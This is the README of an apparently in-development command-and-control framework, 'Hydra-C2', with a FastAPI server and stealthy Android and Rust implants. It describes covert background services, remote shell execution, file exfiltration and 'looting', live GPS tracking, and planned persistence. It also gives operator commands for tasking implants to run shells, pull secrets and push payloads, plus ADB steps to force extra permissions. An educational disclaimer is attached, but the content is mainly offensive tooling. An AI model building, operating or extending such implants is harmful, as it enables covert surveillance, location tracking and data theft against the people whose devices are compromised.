```markdown
   _    _           _              _____ ___  
  | |  | |         | |            / ____|__ \ 
  | |__| |_   _  __| |_ __ __ _  | |       ) |
  |  __  | | | |/ _` | '__/ _` | | |      / / 
  | |  | | |_| | (_| | | | (_| | | |____ / /_ 
  |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
           __/ |                              
          |___/                               


```
---

**Project Hydra-C2 is a multi-headed C2 (Command and Control) framework.**

---

### ⚠️ DISCLAIMER

**For Educational and Authorized Security Testing Purposes Only.**
The use of this framework for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

---

## 🚀 Project Status: In Development

* [x] Secure SSL-Pinned Handshake (Android/FastAPI)
* [x] FastAPI Backend with SQLite Integration
* [x] Android "Ghost Service" Background Execution
* [x] Verified 200 OK Handshake
* [x] Heartbeat Loop (60s intervals with WakeLock)
* [x] Desktop Head (Rust Async implementation)
* [x] Command & Tasking System (JSON Parser)
* [x] Persistent Task Database (Task Queuing per ID)
* [x] Remote Shell Execution (Desktop Head)
* [x] Multi-Platform Telemetry (RAM, OS, Battery, Network SSID)
* [x] File Infiltration & Exfiltration (Download/Upload)
* [x] **Live GPS Exfiltration (Fused Location Provider)**
* [ ] Persistence Module (Systemd/Registry)

---

## 🛠 Project Structure

### 🛰 The Hydra (C2 Server)

The brain of the operation, built with **Python & FastAPI**.

* **Features:**
* **Dynamic Intelligence:** Platform-aware logging (Mobile vs Desktop).
* **Automated Tracking:** SQLite database tracking for all "Heads."
* **Command Dispatcher:** Sends platform-specific JSON payloads.
* **Output Collector:** Receives and logs remote shell results and GPS data via `/report`.
* **File Manager**: Dedicated endpoints for /upload (Exfiltration) and /download (Looting).
* **Path:** `/hydra_c2/`

### 📱 Android Head

A stealthy background service built with **Kotlin**.

* **Features:**
* **Geospatial Intelligence:** High-accuracy coordinate retrieval (Lat, Lon, Alt).
* **Network Intelligence:** Reports active SSID or Mobile Carrier name.
* **Vitals Reporting:** Real-time Battery percentage and OS version tracking.
* **Persistence:** Foreground Service with a `NotificationChannel` and `WakeLock`.
* **Action Execution:** Trigger hardware actions (e.g., Vibrator) via C2.
* **File Operations:** Full support for file exfiltration and payload ingestion.
* **Path:** `/hydra_android/`

### 💻 Desktop Head

A high-performance, lightweight agent built with **Rust**.

* **Features:**
* **Runtime:** Powered by `Tokio` for non-blocking async operations.
* **Telemetry:** Gathers Hostname, OS version, and RAM details via `sysinfo`.
* **Shell Executor:** Executes arbitrary commands via `sh -c` and returns output.
* **File Transfer**: Built-in support for multipart file uploads and binary downloads.
* **Path:** `/hydra_desktop/`

---

## ⚙️ Setup & Execution

### 1. Server Setup (Arch Linux)

Ensure your `.pem` files are in the server directory (they are ignored by git).

```bash
cd hydra_c2
python main.py

```

### 2. Android Client Setup

1. Open `hydra_android` in Android Studio.
2. Ensure **Location Permissions** are granted for SSID visibility.
3. Deploy to emulator or physical device.

### 3. Desktop Client Setup

```bash
cd hydra_desktop
cargo run

```

---

## 🕹 Usage (The Commander)

Use `commander.py` to inject tasks into the database.

**Get GPS Location (Android):**

```bash
python commander.py ANDROID-HEAD-01 location

```

**Remote Shell (Desktop):**

```bash
python commander.py DESKTOP-HEAD-ALPHA shell "whoami && uptime"

```

**Vibrate (Android):**

```bash
python commander.py ANDROID-HEAD-01 vibrate 2500

```

**File Download (Infiltrate)(Desktop/Android):**

```bash
python commander.py DESKTOP-HEAD-ALPHA download backdoor.txt
python commander.py ANDROID-HEAD-01 download payload.bin

```

**File Upload (Exfiltrate)(Desktop/Android):**

```bash
python commander.py DESKTOP-HEAD-ALPHA upload secret_data.csv
python commander.py ANDROID-HEAD-01 upload /data/user/0/com.hydra.client/files/secrets.txt

```

**Send system Message (Desktop/Android):**

```bash
python commander.py DESKTOP-HEAD-ALPHA msg "System update starting..."

```

---

## 🔧 Troubleshooting & Performance (Arch Linux)

### 🖥 GPU & Emulator Stability

On machines with AMD Vega/Integrated graphics, use **SwiftShader (CPU)** to avoid "Broken Pipe" or "Write Lock" crashes:

```bash
/opt/android-sdk/emulator/emulator -avd HydraTester -gpu swiftshader_indirect -no-snapshot-load -no-audio

```

### 🔐 Permission Bypass (Storage & Location)

If exfiltration fails or location returns null, use ADB to elevate the agent's permissions:

```bash
# Storage Permissions
adb root
adb shell pm grant com.hydra.client android.permission.READ_EXTERNAL_STORAGE
adb shell "mv /sdcard/Download/loot.txt /data/user/0/com.hydra.client/files/loot.txt"

# Location Permissions
adb shell pm grant com.hydra.client android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.hydra.client android.permission.ACCESS_COARSE_LOCATION

```

### 🌍 Simulating GPS Movement

If testing on a static emulator, force a coordinate update:

```bash
adb emu geo fix -31.4167 -64.1833

```

---

## 🔒 Security Policy & Persistence

> **Instruction [2026-01-11]:** All `.pem` (certificates) and `.db` (database) files must remain untracked. Never commit keys or active databases to the repository.

---